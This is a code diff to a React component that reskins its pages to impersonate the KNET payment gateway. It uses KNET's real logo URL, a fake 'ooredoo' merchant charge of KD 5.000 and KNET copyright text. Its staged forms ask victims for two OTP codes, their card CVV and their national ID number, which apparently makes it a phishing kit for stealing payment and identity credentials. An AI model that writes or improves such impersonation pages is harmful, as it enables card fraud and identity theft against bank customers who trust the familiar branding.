@@ -81,68 +81,153 @@ export default function Loading() {
     console.log(`Submitted ${stage}:`, formData);
   };
 
-  // Loading screen
+  // Loading screen - KNET style
   if (currentStage === "loading") {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
-        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full text-center">
-          <div className="mb-6">
-            <div className="inline-block">
-              <div className="relative w-16 h-16">
-                <div className="absolute inset-0 bg-gradient-to-r from-blue-400 to-indigo-600 rounded-full animate-spin"></div>
-                <div className="absolute inset-1 bg-white rounded-full"></div>
+      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
+        {/* Header Banner */}
+        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
+          <img 
+            src="https://www.knet.com.kw/images/logo.png" 
+            alt="KNET" 
+            className="h-12"
+            onError={(e) => {
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+        </div>
+
+        <div className="w-full max-w-2xl mt-20">
+          {/* Merchant Info Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-xl">KNET</span>
+              </div>
+            </div>
+            <div className="space-y-2">
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Merchant:</span>
+                <span className="text-gray-600">ooredoo</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Amount:</span>
+                <span className="text-gray-600">KD 5.000</span>
               </div>
             </div>
           </div>
 
-          <h1 className="text-2xl font-bold text-gray-800 mb-4">جاري المعالجة</h1>
-          <p className="text-gray-600 mb-4">{status}</p>
-
-          <div className="space-y-2">
-            <div className="flex items-center justify-center gap-2">
-              <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
-              <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0.2s" }}></div>
-              <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0.4s" }}></div>
+          {/* Processing Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8 text-center">
+            <div className="flex justify-center mb-6">
+              <div className="relative w-12 h-12">
+                <div className="absolute inset-0 border-4 border-blue-400 border-t-blue-600 rounded-full animate-spin"></div>
+              </div>
             </div>
+            
+            <h2 className="text-xl font-bold text-gray-800 mb-2">Processing.. please wait ...</h2>
+            <p className="text-gray-700 text-sm mb-4">
+              يرجى الانتظار، جاري معالجة الدفع حالياً لحظات...
+            </p>
+            
+            <p className="text-gray-600 text-sm">{status}</p>
           </div>
 
-          <p className="text-sm text-gray-500 mt-6">يرجى عدم إغلاق هذه الصفحة</p>
+          {/* Footer */}
+          <div className="text-center mt-8 text-xs text-gray-600">
+            <p>All Rights Reserved, Copyright 2024 ◆</p>
+            <p className="text-blue-600 hover:underline">
+              The Shared Electronic Banking Services Company - KNET
+            </p>
+          </div>
         </div>
       </div>
     );
   }
 
-  // OTP Form (Stage 1)
+  // OTP Form (Stage 1 or 2)
   if (currentStage === "otp1" || currentStage === "otp2") {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
-        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
-          <div className="text-center mb-6">
-            <h1 className="text-2xl font-bold text-gray-800">التحقق من الرمز</h1>
-            <p className="text-gray-600 text-sm mt-2">أدخل رمز التحقق المرسل إلى هاتفك</p>
+      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
+        {/* Header Banner */}
+        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
+          <img 
+            src="https://www.knet.com.kw/images/logo.png" 
+            alt="KNET" 
+            className="h-12"
+            onError={(e) => {
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+        </div>
+
+        <div className="w-full max-w-2xl mt-20">
+          {/* Merchant Info Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-xl">KNET</span>
+              </div>
+            </div>
+            <div className="space-y-2">
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Merchant:</span>
+                <span className="text-gray-600">ooredoo</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Amount:</span>
+                <span className="text-gray-600">KD 5.000</span>
+              </div>
+            </div>
           </div>
 
-          <form onSubmit={(e) => handleFormSubmit(e, currentStage)}>
-            <div className="mb-4">
-              <label className="block text-gray-700 font-semibold mb-2">رمز التحقق</label>
-              <input
-                type="text"
-                placeholder="000000"
-                maxLength={6}
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
-                value={formData.otp || ""}
-                onChange={(e) => setFormData({ ...formData, otp: e.target.value })}
-                required
-              />
-            </div>
+          {/* OTP Form Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
+            <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
+              {currentStage === "otp1" ? "التحقق من الرمز الأول" : "التحقق من الرمز الثاني"}
+            </h2>
 
-            <button
-              type="submit"
-              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
-            >
-              تأكيد
-            </button>
-          </form>
+            <form onSubmit={(e) => handleFormSubmit(e, currentStage)} className="space-y-6">
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2 text-sm">
+                  رمز التحقق (OTP)
+                </label>
+                <input
+                  type="text"
+                  placeholder="000000"
+                  maxLength={6}
+                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-center text-lg tracking-widest"
+                  value={formData.otp || ""}
+                  onChange={(e) => setFormData({ ...formData, otp: e.target.value })}
+                  required
+                />
+              </div>
+
+              <div className="flex gap-4">
+                <button
+                  type="submit"
+                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
+                >
+                  Confirm / تأكيد
+                </button>
+                <button
+                  type="button"
+                  className="flex-1 bg-gray-400 text-white py-3 rounded-lg font-bold hover:bg-gray-500 transition"
+                  onClick={() => setCurrentStage("loading")}
+                >
+                  Cancel / إلغاء
+                </button>
+              </div>
+            </form>
+          </div>
+
+          {/* Footer */}
+          <div className="text-center mt-8 text-xs text-gray-600">
+            <p>All Rights Reserved, Copyright 2024 ◆</p>
+            <p className="text-blue-600 hover:underline">
+              The Shared Electronic Banking Services Company - KNET
+            </p>
+          </div>
         </div>
       </div>
     );
@@ -151,34 +236,86 @@ export default function Loading() {
   // CVV Form
   if (currentStage === "cvv") {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
-        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
-          <div className="text-center mb-6">
-            <h1 className="text-2xl font-bold text-gray-800">التحقق من CVV</h1>
-            <p className="text-gray-600 text-sm mt-2">أدخل رمز CVV من ظهر بطاقتك</p>
+      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
+        {/* Header Banner */}
+        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
+          <img 
+            src="https://www.knet.com.kw/images/logo.png" 
+            alt="KNET" 
+            className="h-12"
+            onError={(e) => {
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+        </div>
+
+        <div className="w-full max-w-2xl mt-20">
+          {/* Merchant Info Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-xl">KNET</span>
+              </div>
+            </div>
+            <div className="space-y-2">
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Merchant:</span>
+                <span className="text-gray-600">ooredoo</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Amount:</span>
+                <span className="text-gray-600">KD 5.000</span>
+              </div>
+            </div>
           </div>
 
-          <form onSubmit={(e) => handleFormSubmit(e, "cvv")}>
-            <div className="mb-4">
-              <label className="block text-gray-700 font-semibold mb-2">رمز CVV</label>
-              <input
-                type="text"
-                placeholder="000"
-                maxLength={4}
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
-                value={formData.cvv || ""}
-                onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
-                required
-              />
-            </div>
+          {/* CVV Form Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
+            <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
+              التحقق من رمز CVV
+            </h2>
 
-            <button
-              type="submit"
-              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
-            >
-              تأكيد
-            </button>
-          </form>
+            <form onSubmit={(e) => handleFormSubmit(e, "cvv")} className="space-y-6">
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2 text-sm">
+                  رمز CVV (من ظهر البطاقة)
+                </label>
+                <input
+                  type="text"
+                  placeholder="000"
+                  maxLength={4}
+                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-center text-lg tracking-widest"
+                  value={formData.cvv || ""}
+                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
+                  required
+                />
+              </div>
+
+              <div className="flex gap-4">
+                <button
+                  type="submit"
+                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
+                >
+                  Confirm / تأكيد
+                </button>
+                <button
+                  type="button"
+                  className="flex-1 bg-gray-400 text-white py-3 rounded-lg font-bold hover:bg-gray-500 transition"
+                  onClick={() => setCurrentStage("loading")}
+                >
+                  Cancel / إلغاء
+                </button>
+              </div>
+            </form>
+          </div>
+
+          {/* Footer */}
+          <div className="text-center mt-8 text-xs text-gray-600">
+            <p>All Rights Reserved, Copyright 2024 ◆</p>
+            <p className="text-blue-600 hover:underline">
+              The Shared Electronic Banking Services Company - KNET
+            </p>
+          </div>
         </div>
       </div>
     );
@@ -187,33 +324,85 @@ export default function Loading() {
   // Hawety Form
   if (currentStage === "hawety") {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
-        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
-          <div className="text-center mb-6">
-            <h1 className="text-2xl font-bold text-gray-800">التحقق من الهوية</h1>
-            <p className="text-gray-600 text-sm mt-2">أدخل رقم هويتك</p>
+      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
+        {/* Header Banner */}
+        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
+          <img 
+            src="https://www.knet.com.kw/images/logo.png" 
+            alt="KNET" 
+            className="h-12"
+            onError={(e) => {
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+        </div>
+
+        <div className="w-full max-w-2xl mt-20">
+          {/* Merchant Info Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-xl">KNET</span>
+              </div>
+            </div>
+            <div className="space-y-2">
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Merchant:</span>
+                <span className="text-gray-600">ooredoo</span>
+              </div>
+              <div className="flex justify-between items-center">
+                <span className="font-semibold text-gray-700">Amount:</span>
+                <span className="text-gray-600">KD 5.000</span>
+              </div>
+            </div>
           </div>
 
-          <form onSubmit={(e) => handleFormSubmit(e, "hawety")}>
-            <div className="mb-4">
-              <label className="block text-gray-700 font-semibold mb-2">رقم الهوية</label>
-              <input
-                type="text"
-                placeholder="123456789"
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
-                value={formData.hawety || ""}
-                onChange={(e) => setFormData({ ...formData, hawety: e.target.value })}
-                required
-              />
-            </div>
+          {/* Hawety Form Box */}
+          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
+            <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
+              التحقق من بيانات الهوية
+            </h2>
 
-            <button
-              type="submit"
-              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
-            >
-              تأكيد
-            </button>
-          </form>
+            <form onSubmit={(e) => handleFormSubmit(e, "hawety")} className="space-y-6">
+              <div>
+                <label className="block text-gray-700 font-semibold mb-2 text-sm">
+                  رقم الهوية
+                </label>
+                <input
+                  type="text"
+                  placeholder="123456789"
+                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
+                  value={formData.hawety || ""}
+                  onChange={(e) => setFormData({ ...formData, hawety: e.target.value })}
+                  required
+                />
+              </div>
+
+              <div className="flex gap-4">
+                <button
+                  type="submit"
+                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
+                >
+                  Confirm / تأكيد
+                </button>
+                <button
+                  type="button"
+                  className="flex-1 bg-gray-400 text-white py-3 rounded-lg font-bold hover:bg-gray-500 transition"
+                  onClick={() => setCurrentStage("loading")}
+                >
+                  Cancel / إلغاء
+                </button>
+              </div>
+            </form>
+          </div>
+
+          {/* Footer */}
+          <div className="text-center mt-8 text-xs text-gray-600">
+            <p>All Rights Reserved, Copyright 2024 ◆</p>
+            <p className="text-blue-600 hover:underline">
+              The Shared Electronic Banking Services Company - KNET
+            </p>
+          </div>
         </div>
       </div>
     );
